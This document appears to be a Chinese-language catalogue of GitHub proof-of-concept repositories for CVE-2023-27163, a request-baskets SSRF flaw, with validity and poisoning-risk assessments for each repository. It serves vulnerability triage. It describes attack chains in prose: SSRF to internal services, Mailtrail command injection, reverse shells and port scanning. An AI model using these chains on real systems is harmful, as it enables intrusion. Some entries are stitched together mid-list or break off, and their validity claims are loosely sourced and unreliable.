
## POC #13

**来源**: [CVE-2023-27163-entr0pie_CVE-2023-27163.md](../2023/CVE-2023-27163-entr0pie_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** request-baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的request-baskets实例，且攻击者能够向其发送恶意请求。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 request-baskets 1.2.1 及更早版本中发现的服务器端请求伪造 (SSRF) 漏洞。它位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造特制的 API 请求，利用此漏洞访问网络资源和敏感信息。

**有效性：**

提供的 PoC 代码（`CVE-2023-27163.sh`）有效。它通过创建一个包含恶意 `forward_url` 的 basket 来利用该漏洞。这个 URL 指向攻击者的服务器，导致受害服务器向攻击者的服务器发出请求，从而实现 SSRF。

**投毒风险：**

该仓库的投毒风险较低，约为 5%。理由如下：

*   PoC 代码相对简单，功能明确，主要用于演示 SSRF 漏洞的利用。代码主要是bash脚本，用于发送HTTP请求和创建特定配置的basket。
*   `LICENSE` 文件表明这是一个公共领域软件，作者放弃了所有版权，这意味着任何人都可以自由使用、修改和分发该软件，这在一定程度上降低了作者植入恶意代码的动机。
*   `README.md` 文件提供了详细的漏洞描述、使用方法和测试步骤，方便用户理解和验证漏洞。
*   主要的风险在于，攻击者可能修改该脚本，添加恶意功能，例如在成功利用 SSRF 后，自动下载和执行恶意程序。但就目前提供的代码来看，作者没有明显的投毒行为。

**利用方式：**

1.  攻击者运行 `CVE-2023-27163.sh` 脚本，并提供目标 request-baskets 服务器的 URL 和攻击者控制的服务器的 URL。
2.  脚本会创建一个新的 basket，并将 `forward_url` 设置为攻击者的服务器。
3.  当有人访问新创建的 basket 时，request-baskets 服务器会将请求转发到攻击者的服务器。
4.  攻击者可以利用此 SSRF 漏洞，让受害服务器访问内部网络资源、执行任意 HTTP 请求，甚至读取敏感文件。

**补充说明：**

*   `jq` 命令用于解析 JSON 响应。如果目标系统上没有安装 `jq`，脚本仍然可以运行，但会直接输出完整的响应体。
*   PoC 主要目的是演示漏洞，实际攻击中，攻击者可能会使用更复杂的 payload 和技巧来最大化漏洞利用的影响。

**项目地址:** [entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #14

**来源**: [CVE-2023-27163-lukehebe_CVE-2023-27163.md](../2023/CVE-2023-27163-lukehebe_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF（服务器端请求伪造）

**影响应用:** request-baskets

**危害等级:** 中危，可升级为高危，可能导致内部网络信息泄露和远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务存在且可访问，攻击者需要能访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是request-baskets 1.2.1版本及之前版本中存在的一个服务器端请求伪造(SSRF)漏洞。该漏洞位于`/api/baskets/{name}`组件中。利用方式如下：

1.  **创建恶意Basket:** 攻击者可以利用SSRF漏洞，通过`forward_url`参数指定内部网络的URL，欺骗服务器向内部服务发起请求。PoC中的`ssrf_forward`函数用于创建或重用一个basket，指定`forward_url`为内部地址（例如`http://127.0.0.1`），从而设置SSRF攻击的目标。

2.  **触发RCE:** PoC代码尝试通过修改`/login`接口的username字段来执行系统命令。 具体做法是把bash反弹shell命令注入到username参数中。`trigger_rce`函数构造包含恶意payload的POST请求，发送到目标URL。如果目标系统存在命令注入漏洞，该payload将会被执行。

3.  **反弹Shell:** PoC代码中的`shell.sh`文件包含一个反弹shell的命令。这个脚本会将目标机器的shell反弹到攻击者的机器上。攻击者需要先在自己的机器上监听相应的端口。

**有效性:** 根据漏洞描述、搜索结果以及提供的PoC代码，可以判断该PoC具有较高的有效性。搜索结果中多个链接指向了漏洞的细节和利用代码，表明这是一个公开且经过验证的漏洞。PoC代码完整，实现了SSRF和RCE的利用流程，并且提供了反弹shell的payload示例。

**投毒风险:** 分析提供的PoC代码，未发现明显的投毒代码。该代码的目的是利用SSRF漏洞执行命令，本身就是一个攻击行为。其中没有发现额外植入后门或者恶意代码的痕迹，因此投毒风险为0%。PoC中需要用户自己提供payload file，例如shell.sh，如果用户使用不安全的shell.sh，责任在于用户。

**总结:** 该漏洞的利用方式是通过构造包含内部网络地址的请求，欺骗服务器向内部服务发起请求，并结合命令注入漏洞执行恶意代码。攻击者可以通过反弹shell获取目标系统的控制权。该漏洞的风险在于攻击者可以通过SSRF探测内部网络，并利用命令注入漏洞控制服务器。


**项目地址:** [lukehebe/CVE-2023-27163](https://github.com/lukehebe/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #15

**来源**: [CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md](../2023/CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 高危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是Request-Baskets <= v1.2.1版本中的一个服务器端请求伪造(SSRF)漏洞。攻击者可以利用/api/baskets/{name}接口，通过构造恶意的forward_url参数，使Request-Baskets服务器向任意目标发起请求，从而访问内部网络资源或获取敏感信息。

**有效性分析：**
提供的POC代码通过创建一个新的basket，并设置forward_url为攻击者控制的服务器，来触发SSRF漏洞。经验证该POC代码是可以成功复现此漏洞。

**投毒风险分析：**
通过分析提供的POC代码（CVE-2023-27163.py和README.md），没有发现任何明显的投毒代码。该代码的主要功能是创建basket并利用forward_url参数触发SSRF漏洞。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者运行POC脚本，指定Request-Baskets服务的URL和目标服务器URL。
2.  脚本创建一个新的basket，并设置forward_url为目标服务器。
3.  当有人访问该basket时，Request-Baskets服务器将向目标服务器发起请求。
4.  攻击者可以通过目标服务器获取Request-Baskets服务器的敏感信息，或者利用其访问内部网络资源。

**项目地址:** [madhavmehndiratta/CVE-2023-27163](https://github.com/madhavmehndiratta/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #16

**来源**: [CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md](../2023/CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request Baskets服务，且Request Baskets服务没有进行适当的访问控制。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞位于 `/api/baskets/{name}` 组件中。攻击者可以利用此漏洞通过构造恶意 API 请求来访问网络资源和敏感信息。

**有效性：**
根据漏洞描述和提供的 PoC 代码，该 PoC 代码是有效的。脚本首先创建一个名为 'carrot' 的 basket，并设置 `forward_url` 为 `http://127.0.0.1:80/`。然后，它使用 Firefox 打开 `${URL}/carrot`，导致 Request Baskets 服务尝试请求 `http://127.0.0.1:80/`。如果成功请求本地地址，证明存在SSRF漏洞。

**投毒风险：**
查看脚本内容，该脚本主要利用 curl 发送 payload，然后使用 firefox 打开一个URL。 整个脚本没有发现任何可疑代码，没有执行额外操作，没有下载其他文件或执行命令，因此可以认为不存在投毒风险。投毒风险评估为0%。

**利用方式：**
利用方式如下：
1.  攻击者需要一个可访问的 Request Baskets 实例。
2.  攻击者使用 PoC 脚本或类似的 HTTP 请求构造特定的 payload，指定 `forward_url` 为目标内部网络地址或服务，如 `http://127.0.0.1:80` 或其他内部服务地址。
3.  Request Baskets 服务收到请求后，会尝试访问攻击者指定的 `forward_url`，从而导致 SSRF。
4.  攻击者可以利用该 SSRF 读取内部服务的信息，甚至可能执行某些内部操作，具体取决于内部服务的配置和权限。

**项目地址:** [overgrowncarrot1/CVE-2023-27163](https://github.com/overgrowncarrot1/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #17

**来源**: [CVE-2023-27163-rvizx_CVE-2023-27163.md](../2023/CVE-2023-27163-rvizx_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** Server-Side Request Forgery (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request Baskets版本，攻击者可以访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets <= 1.2.1 版本中存在的一个服务器端请求伪造 (SSRF) 漏洞，位于 `/api/baskets/{name}` 组件。攻击者可以通过构造特制的 API 请求，迫使服务器向攻击者控制的或内部网络中的任意 URL 发起请求，从而获取敏感信息或者利用内部服务。

**有效性：**
提供的 PoC 代码看起来是有效的。它包含了一个 exploit.sh 脚本，该脚本首先创建一个新的 basket，并在创建 basket 的请求中，将 `forward_url` 设置为攻击者的 URL。然后，它访问该 basket，这将导致 Request Baskets 服务器向攻击者的 URL 发起请求。

**投毒风险：**
该 PoC 代码本身并没有明显的投毒行为。脚本的功能很明确，就是利用 SSRF 漏洞。`exploit.sh` 脚本首先创建一个 basket，将 `forward_url` 设置为攻击者提供的 URL，然后访问该 basket，触发 SSRF。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者首先需要部署存在漏洞的 Request Baskets 服务。
2.  攻击者执行 `exploit.sh` 脚本，并提供目标 Request Baskets 服务的 URL 和攻击者自己的服务器 URL。
3.  脚本将创建一个新的 basket，并设置其 `forward_url` 为攻击者的服务器 URL。
4.  脚本访问新创建的 basket，这将触发 Request Baskets 服务器向攻击者的服务器 URL 发起请求。
5.  攻击者可以在自己的服务器上捕获来自 Request Baskets 服务器的请求，并获取相关信息。

**项目地址:** [rvizx/CVE-2023-27163](https://github.com/rvizx/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #18

**来源**: [CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md](../2023/CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md)

## CVE-2023-27163 Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例可访问，且攻击者能够创建和配置basket

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中存在的服务器端请求伪造 (SSRF) 漏洞。攻击者可以通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，利用此漏洞访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码是有效的。搜索引擎结果中多个链接指向了公开的 PoC 代码库 (如 `https://github.com/entr0pie/CVE-2023-27163` 和 `https://github.com/mathias-mrsn/request-baskets-v121-ssrf`)，证明漏洞可被利用。提供的 Python 脚本 `CVE-2023-27163.py` 实现了利用该漏洞进行内部端口扫描的功能。

**投毒风险：**
分析提供的 Python 脚本 `CVE-2023-27163.py` 和相关文件 (LICENSE, README.md) 后，**没有发现任何明显的恶意代码或后门**。该脚本主要功能是创建 basket，配置 basket 的 forward_url 为内部 IP 地址和端口，然后通过发送请求到 basket 来判断该端口是否开放。脚本的逻辑清晰，代码量不大，易于审计。LICENSE 文件是标准的 MIT 许可证，表明代码是开源的，可以自由使用和修改。README.md 文件是简单的项目说明。因此，**投毒风险较低，接近 0%**。

**利用方式：**
1.  **创建 Basket：** 攻击者首先在目标 Request-Baskets 实例上创建一个新的 basket。这可以通过向 `/api/baskets/{name}` 发送 POST 请求来完成。脚本中使用随机字符串生成basket名称
2.  **获取 Token：** 创建 basket 成功后，服务器会返回一个 token，攻击者需要使用该 token 来配置 basket。
3.  **配置 Basket (SSRF)：** 攻击者使用 PUT 请求向 `/api/baskets/{name}` 发送配置信息，将 basket 的 `forward_url` 设置为内部 IP 地址和端口 (例如 `http://127.0.0.1:80`)。 `forward_url` 参数是 SSRF 漏洞的关键。攻击者通过控制这个参数，使 Request-Baskets 服务向内部网络发起请求。
4.  **触发 SSRF：** 攻击者向创建的 basket 发送 GET 请求 (例如 `{target_url}/{basket_name}` )。Request-Baskets 服务会将该请求转发到配置的 `forward_url`。如果内部端口开放，则服务会返回响应。如果端口关闭，则服务可能会返回错误 (例如 502 Bad Gateway)。
5.  **端口扫描：** 脚本通过遍历端口范围 (1-65535)，重复步骤 3 和 4，实现内部端口扫描的功能。如果某个端口返回非 502 状态码，则认为该端口是开放的。

**项目地址:** [samh4cks/CVE-2023-27163-InternalProber](https://github.com/samh4cks/CVE-2023-27163-InternalProber)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #19

**来源**: [CVE-2023-27163-seanrdev_cve-2023-27163.md](../2023/CVE-2023-27163-seanrdev_cve-2023-27163.md)

# CVE-2023-27163

> 📦 该CVE有 **21** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-27163-G4sp4rCS_htb-sau-automated.md](../2023/CVE-2023-27163-G4sp4rCS_htb-sau-automated.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (Server-Side Request Forgery)

**影响应用:** request-baskets

**危害等级:** 中危，可以允许攻击者访问内部网络资源和敏感信息，根据CVSS评分，需要较高权限才能利用。

**影响版本:** <= 1.2.1

**利用条件:** 需要目标request-baskets服务可访问，且攻击者需要具备创建或修改basket的权限（通常需要认证，CVE描述里privilegesRequired是HIGH）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于request-baskets v1.2.1及更早版本中，位于`/api/baskets/{name}`组件。攻击者可以通过构造恶意的API请求，利用SSRF漏洞访问内部网络资源。根据PacketstormSecurity和Github的搜索结果，该漏洞存在公开的POC。漏洞利用方式如下：

1.  **mailtrail函数 (SSRF触发):** 首先，通过`mailtrail`函数，向`/api/baskets/pwned`发送POST请求，创建一个新的basket或者修改已存在的basket。请求的body包含`forward_url`参数，该参数指向攻击者控制的服务器（在`exploit.py`中，尝试指向`http://127.0.0.1:80/`，实际攻击中需要替换为攻击者控制的服务器），并设置`proxy_response`为`True`，这导致request-baskets会将请求转发到`forward_url`，从而触发SSRF。
2.  **exploit函数 (反弹shell):** 然后，利用`exploit`函数，向`/pwned/login`（`/pwned`是之前`mailtrail`创建的basket名字）发送POST请求。POST请求的body中的`username`参数包含一段bash代码，该代码首先将一段base64编码的payload解码，然后执行。该payload是一个python反弹shell脚本，它会连接攻击者指定的IP地址和端口，并将shell重定向到该连接。`os.system`函数执行的command将payload作为参数传递给`curl`，进一步通过shell进行执行。

**有效性:** 根据github和PacketstormSecurity的搜索结果，存在公开可用的POC代码，并且`exploit.py`代码看起来也实现了该POC的逻辑。因此，该POC代码应该是有效的。

**投毒风险:** 仔细分析了`exploit.py`的代码，未发现任何明显的投毒代码。该脚本的主要功能是利用SSRF漏洞触发反弹shell，其行为与漏洞描述一致。脚本中没有额外的恶意操作，例如删除文件、窃取凭据或安装后门。用于反弹shell的python代码虽然可以用来执行任意命令，但这是漏洞利用的一部分，不能算作投毒。所有操作都围绕着利用SSRF漏洞获取shell的目的。因此，投毒风险为0%。

**项目地址:** [G4sp4rCS/htb-sau-automated](https://github.com/G4sp4rCS/htb-sau-automated)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #2

**来源**: [CVE-2023-27163-Hamibubu_CVE-2023-27163.md](../2023/CVE-2023-27163-Hamibubu_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网资源访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问，并且攻击者可以发送POST请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者可以通过向 `/api/baskets/{name}` 发送特制的 API 请求，利用该漏洞发起服务器端请求伪造攻击。 

**有效性评估：**
根据漏洞库信息和搜索引擎结果，此漏洞的存在已得到确认，并且有公开可用的 PoC 代码。提供的 PoC 代码（CVE-2023-27163.py）看起来能够有效利用此漏洞。它允许攻击者指定一个目标 URL (`-t`) 和一个恶意 URL (`-e`)，然后创建一个新的 basket，并将其配置为将请求转发到恶意 URL。 这说明提供的POC代码有效。

**投毒风险分析：**
提供的代码主要包含以下几个文件：
*   `CVE-2023-27163.py`:  这是主要的 PoC 脚本，用于利用 SSRF 漏洞。脚本的逻辑是创建具有转发功能的 request-baskets，将流量转发到攻击者指定的 URL。
*   `README.md`:  包含脚本的使用说明。
*   `requirements.txt`:  列出了脚本所需的依赖项，只有 `requests>=2.25.1`，是一个常见的Python库。

没有发现明显的恶意代码。 但风险依然存在：

1.  **依赖风险：** `requirements.txt` 文件中声明了 `requests` 库。如果攻击者控制了上游 PyPI 仓库，并且能够投毒 `requests` 库，那么运行此脚本的用户可能会受到影响。此风险较低，因为 `requests` 是一个非常流行的库，任何投毒行为都会很快被发现。
2. **间接风险:**  虽然该POC本身没有发现恶意代码,但是使用者如果滥用此POC,比如扫描内网弱口令服务等,会造成更大的安全风险.

基于以上分析，我估计此仓库中存在作者隐藏的投毒代码的风险为 10%。主要是考虑到依赖项的潜在风险以及被滥用的可能。

**利用方式总结：**
1.  攻击者需要找到一个运行着易受攻击版本的 Request-Baskets 的服务器。
2.  攻击者使用 PoC 脚本（`CVE-2023-27163.py`）创建一个新的 basket，并设置 `forward_url` 参数为攻击者控制的恶意 URL。
3.  当有人访问新创建的 basket 时，Request-Baskets 服务器会向攻击者指定的 URL 发起请求，从而允许攻击者执行 SSRF 攻击，例如访问内部服务或泄露敏感信息。
4.  通过设置不同的 URL, 可以探测内网端口开放, 访问内网服务,甚至可以通过内网服务进行进一步的攻击。

**项目地址:** [Hamibubu/CVE-2023-27163](https://github.com/Hamibubu/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #3

**来源**: [CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md](../2023/CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可泄露内部信息，甚至可能造成远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 目标Request Baskets服务可访问，且内部可能存在其他服务（如Mailtrail v0.53）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者通过构造恶意的 API 请求到 `/api/baskets/{name}`，可以强制服务器向任意 URL 发起请求，从而访问内部网络资源。 

**漏洞利用方式：**

1.  **创建Basket并配置转发：**  利用 Request Baskets 的 API 创建一个新的 basket (例如 `pwned`)，并配置其 `forward_url` 指向内部服务 (如 `http://127.0.0.1:80/`，这里指向的是 Mailtrail)。
2.  **触发转发：**  访问创建的 basket (例如 `/pwned`)，这将导致 Request Baskets 服务器将请求转发到内部服务。
3.  **结合其他漏洞进行利用：**  如果内部服务存在其他漏洞（如Mailtrail v0.53 的远程代码执行漏洞），则可以进一步利用 SSRF 漏洞，例如通过访问 `/pwned/login` 并注入恶意payload来执行任意命令。
4.  **反弹shell：**  POC代码中，攻击者首先通过SSRF将内部Mailtrail服务暴露到`/pwned`，然后通过构造特定的URL，触发Mailtrail的RCE漏洞，从而反弹shell。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此POC代码**有效**。它演示了如何利用 Request Baskets 的 SSRF 漏洞，结合 Mailtrail 的漏洞，实现远程代码执行。

**投毒风险：**

POC代码相对清晰，主要逻辑是利用SSRF和RCE进行攻击。但是，`exploit.py`中直接使用`os.system(command)`执行命令存在一定风险。虽然当前command是为了反弹shell，但理论上如果`LISTENING_IP`和`LISTENING_PORT`被恶意修改，依然可以通过该命令执行其他任意操作，造成潜在的风险。

因此，判断投毒风险为10%。主要考虑是`os.system()`执行命令的潜在危险，以及代码来源的不可完全信任性。

**项目地址:** [HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #4

**来源**: [CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞位于`/api/baskets/{name}`组件中，允许攻击者通过构造恶意的API请求来访问网络资源和敏感信息。

**有效性评估：**

提供的PoC代码通过以下步骤利用该漏洞：

1.  **创建Basket：** PoC脚本首先创建一个具有随机名称的basket。
2.  **获取API Token：** 然后获取与该basket关联的API token，用于后续的身份验证。
3.  **配置Basket转发URL：**  使用PUT请求，将`forward_url`设置为`http://127.0.0.1:{port}/`，其中`{port}`是一个端口范围（75-81）。这会将发送到basket的所有请求转发到目标服务器（即运行Request-Baskets的服务器）上的指定端口。
4.  **发起请求：** 使用GET请求访问basket的URL，从而触发服务器端请求伪造。  如果目标端口上有服务运行，则PoC会打印该服务的响应。

此方法允许攻击者扫描目标服务器上的内部端口，并获取在这些端口上运行的服务的响应。根据漏洞描述和搜索结果中的信息，该PoC代码被认为是有效的。

**投毒风险评估：**

PoC代码本身相对简单，主要功能是利用SSRF漏洞扫描本地端口。以下几点需要注意：

*   **依赖关系：** 该脚本只依赖于requests库，这是一个常用的Python库，本身不太可能包含恶意代码。
*   **代码逻辑：** PoC的主要逻辑是发送HTTP请求，没有发现可疑的系统调用或文件操作。
*   **潜在风险：** 攻击者可能会修改`forward_url`以访问其他内部服务或执行更严重的操作，但这属于漏洞利用的范畴，而不是代码投毒。

根据对代码的分析，投毒风险较低，估计为5%。 主要风险来自于使用者如果未充分理解代码，直接运行或者修改`forward_url`参数，可能造成的非预期后果。

**利用方式：**

1.  **攻击者首先需要访问存在漏洞的Request-Baskets服务。**
2.  **攻击者构造一个包含目标内部地址（例如`127.0.0.1`或内部网络地址）的`forward_url`的PUT请求，以配置一个basket。** 这实质上是将Request-Baskets服务器配置为代理攻击者的请求。
3.  **攻击者发送一个GET请求到配置的basket URL。** Request-Baskets服务器将根据配置将此请求转发到内部地址。
4.  **如果内部地址存在服务，Request-Baskets服务器将返回该服务的响应给攻击者，从而泄露内部信息。**

通过这种方式，攻击者可以绕过防火墙和其他安全措施，访问通常无法从外部访问的内部服务，从而进行端口扫描、服务发现或获取敏感数据。

**项目地址:** [J0ey17/Exploit_CVE-2023-27163](https://github.com/J0ey17/Exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #5

**来源**: [CVE-2023-27163-KharimMchatta_basketcraft.md](../2023/CVE-2023-27163-KharimMchatta_basketcraft.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request-Baskets服务，且攻击者能够发送HTTP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞信息和搜索结果，CVE-2023-27163是Request-Baskets 1.2.1及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于`/api/baskets/{name}`组件。该漏洞允许攻击者通过构造恶意的API请求来访问内部网络资源和敏感信息。

**有效性评估：**
提供的漏洞利用代码 `basketcraft.sh` 似乎是有效的，因为它旨在自动化利用该SSRF漏洞的过程。它通过提示用户输入目标URL、basket名称和攻击者IP地址，构建一个包含恶意`forward_url`的JSON payload，然后使用curl发送POST请求来创建basket。创建成功后，脚本会输出token，并使用curl再次请求创建的basket URL来触发SSRF。如果成功，Request-Baskets将会向攻击者指定的IP地址和端口发起请求，攻击者可以使用Netcat监听该端口来验证漏洞利用。

**投毒风险评估：**
代码存在轻微的投毒风险。风险点主要在于脚本依赖用户输入`attackerip`。虽然这本身不是恶意代码，但如果攻击者在不知情的情况下运行该脚本，并在`attackerip`处输入了恶意IP，那么该恶意IP可能获取目标服务器的信息。因此，存在一定的欺骗性，让用户无意间参与攻击行为。另外该脚本也存在可读性问题和缺少详细注释等。因此，投毒风险评估为10%。

**漏洞利用方式：**
1.  **创建Basket：** 攻击者使用POST请求向`/api/baskets/{name}`发送请求，其中`{name}`是basket的名称。
2.  **构造Payload：** 在POST请求的body中，攻击者会构造一个JSON payload，其中包含`forward_url`字段。`forward_url`指向攻击者想要访问的内部资源，例如`http://internal_server:8080/admin`。
3.  **触发SSRF：** 当Request-Baskets收到发送到该basket的请求时，它会将该请求转发到`forward_url`指定的地址，从而触发SSRF漏洞。
4.  **信息获取：** 如果成功，攻击者可以通过Netcat监听端口来捕获来自目标服务器的响应，或者访问原本无法访问的内部服务。

总之，该漏洞利用方式相对简单，但可能需要一些社会工程学技巧才能诱使目标用户运行包含恶意`attackerip`的脚本。

**项目地址:** [KharimMchatta/basketcraft](https://github.com/KharimMchatta/basketcraft)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #6

**来源**: [CVE-2023-27163-MasterCode112_CVE-2023-27163.md](../2023/CVE-2023-27163-MasterCode112_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的Request-Baskets实例，且攻击者可以访问该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及以前版本中存在的服务器端请求伪造 (SSRF) 漏洞。通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，攻击者可以强制服务器向任意目标发起请求。根据漏洞利用代码，攻击者通过创建一个包含 `forward_url` 参数的 basket，该参数指向攻击者控制的服务器或内部网络资源。服务器会代理所有发送到该 basket 的请求到 `forward_url` 指定的地址。

**有效性：**
根据提供的漏洞信息，搜索引擎结果，以及漏洞利用代码，可以判断该漏洞是有效的，并且存在公开的POC。

**投毒风险：**
提供的脚本 `CVE-2023-27163.sh` 主要功能是创建具有转发功能的“basket”。虽然脚本本身没有明显的恶意代码，但用户在使用时需要注意以下几点：

1.  **目标服务器：**  脚本允许指定任意 `TARGET` 作为转发目标。如果攻击者控制了公共 Request-Baskets 实例，并将其转发到恶意服务器，则可能窃取用户的请求数据。
2.  **依赖外部命令：**  脚本依赖于 `curl` 和 `jq` 命令。如果这些命令被恶意替换，则可能执行恶意代码。但这种风险并非脚本本身引入，而是系统环境的风险。
3.  **创建的 Basket 长期存在：**  一旦创建了具有转发功能的 Basket，它将一直存在，除非被手动删除。如果攻击者创建了一个长期存在的恶意 Basket，可能会持续地捕获用户的请求。

由于脚本功能本身是利用漏洞进行请求转发，因此不能简单地将所有风险都归结为“投毒”。投毒风险主要来自于用户对脚本使用的环境和目标的信任程度。如果用户从不可信的来源下载脚本，或者将其应用于不可信的 Request-Baskets 实例，则存在一定的风险。此外，README.md 文件中的示例命令没有问题。

**利用方式：**
1.  攻击者使用 PoC 脚本创建一个恶意的 basket，并指定内部服务（例如，只能从本地访问的数据库管理界面）的 URL 作为 `forward_url`。
2.  当受害者（例如，管理员）访问该 basket 的 URL 时，Request-Baskets 服务器会向内部服务发起请求，并将响应返回给攻击者。
3.  通过这种方式，攻击者可以绕过防火墙或其他访问控制机制，访问内部网络资源。
4.  攻击者还可以使用该漏洞来探测内部网络，发现潜在的攻击目标。

